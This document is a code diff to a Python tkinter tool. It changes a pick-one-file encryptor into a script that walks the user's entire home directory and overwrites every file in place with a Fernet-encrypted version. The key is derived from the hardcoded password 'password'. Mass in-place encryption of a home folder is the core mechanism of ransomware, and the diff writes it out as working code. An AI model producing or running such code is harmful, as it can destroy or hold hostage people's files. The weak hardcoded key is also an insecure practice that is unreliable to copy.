@@ -1,7 +1,8 @@
-from tkinter import filedialog, messagebox, Tk, Button
+from tkinter import messagebox, Tk, Button
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 from cryptography.fernet import Fernet
 import base64
+import os
 
 password = "password"
 
@@ -11,47 +12,51 @@ def derive_key(password):
 
 key = derive_key(password)
 
-def encrypt(filename, key):
+def encrypt_directory(directory, key):
     try:
         f = Fernet(key)
-        with open(filename, "rb") as file:
-            file_data = file.read()
-        encrypted_data = f.encrypt(file_data)
-        with open(filename, "wb") as file:
-            file.write(encrypted_data)
-        messagebox.showinfo("Success", "File encrypted successfully!")
+        for root, _, files in os.walk(directory):
+            for file in files:
+                filepath = os.path.join(root, file)
+                with open(filepath, "rb") as file_obj:
+                    file_data = file_obj.read()
+                encrypted_data = f.encrypt(file_data)
+                with open(filepath, "wb") as file_obj:
+                    file_obj.write(encrypted_data)
+        messagebox.showinfo("Success", "All files encrypted successfully!")
     except Exception as e:
         messagebox.showerror("Error", f"Encryption failed: {e}")
 
-def decrypt(filename, key):
+def decrypt_directory(directory, key):
     try:
         f = Fernet(key)
-        with open(filename, "rb") as file:
-            encrypted_data = file.read()
-        decrypted_data = f.decrypt(encrypted_data)
-        with open(filename, "wb") as file:
-            file.write(decrypted_data)
-        messagebox.showinfo("Success", "File decrypted successfully!")
+        for root, _, files in os.walk(directory):
+            for file in files:
+                filepath = os.path.join(root, file)
+                with open(filepath, "rb") as file_obj:
+                    encrypted_data = file_obj.read()
+                decrypted_data = f.decrypt(encrypted_data)
+                with open(filepath, "wb") as file_obj:
+                    file_obj.write(decrypted_data)
+        messagebox.showinfo("Success", "All files decrypted successfully!")
     except Exception as e:
         messagebox.showerror("Error", f"Decryption failed: {e}")
 
-def choose_file_and_encrypt():
-    file_path = filedialog.askopenfilename()
-    if file_path:
-        encrypt(file_path, key)
+def encrypt_localuser():
+    localuser_path = os.path.expanduser("~")
+    encrypt_directory(localuser_path, key)
 
-def choose_file_and_decrypt():
-    file_path = filedialog.askopenfilename()
-    if file_path:
-        decrypt(file_path, key)
+def decrypt_localuser():
+    localuser_path = os.path.expanduser("~")
+    decrypt_directory(localuser_path, key)
 
 root = Tk()
 root.title("File Encryptor/Decryptor")
 
-encrypt_button = Button(root, text="Encrypt File", command=choose_file_and_encrypt)
+encrypt_button = Button(root, text="Encrypt All in %localuser%", command=encrypt_localuser)
 encrypt_button.pack(pady=10)
 
-decrypt_button = Button(root, text="Decrypt File", command=choose_file_and_decrypt)
+decrypt_button = Button(root, text="Decrypt All in %localuser%", command=decrypt_localuser)
 decrypt_button.pack(pady=10)
 
 root.mainloop()
